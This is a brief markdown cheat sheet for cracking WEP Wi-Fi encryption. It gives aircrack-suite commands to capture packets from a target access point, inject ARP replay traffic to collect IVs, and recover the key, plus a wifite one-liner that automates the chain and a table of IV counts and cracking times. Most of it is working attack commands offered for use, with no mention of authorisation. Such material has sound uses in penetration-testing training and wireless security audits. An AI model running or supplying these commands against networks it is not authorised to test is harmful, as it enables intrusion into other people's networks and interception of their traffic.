# WEP Cracking

WEP is obsolete but still appears in legacy environments. WEP cracking uses statistical attacks on IVs (Initialization Vectors).

## Capture WEP Packets
```bash
# Target the WEP AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
```

## ARP Replay Attack (Speed Up Capture)
```bash
# Inject ARP packets to generate new IVs quickly
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CLIENT_MAC wlan0mon

# Wait until you have 20,000+ IVs (shown in airodump-ng)
# 20k IVs = 50%+ chance of cracking 64-bit WEP
# 500k+ IVs = 104-bit WEP
```

## Crack WEP
```bash
# Using aircrack-ng
aircrack-ng wep_capture-01.cap

# More IVs = faster cracking
# -a 1 = WEP (static WEP)
# -a 2 = WPA/WPA2-PSK
aircrack-ng -a 1 wep_capture-01.cap
```

## Automated with Wifite
```bash
# Wifite handles the entire WEP attack chain
sudo wifite
# Select WEP network from the list
```

## WEP Key Lengths
| Key Size | IVs Needed | Cracking Time |
|---|---|---|
| 64-bit (40-bit) | 20,000-50,000 | Seconds |
| 128-bit (104-bit) | 500,000+ | Minutes |
| 152-bit (128-bit) | 1,000,000+ | Hours |
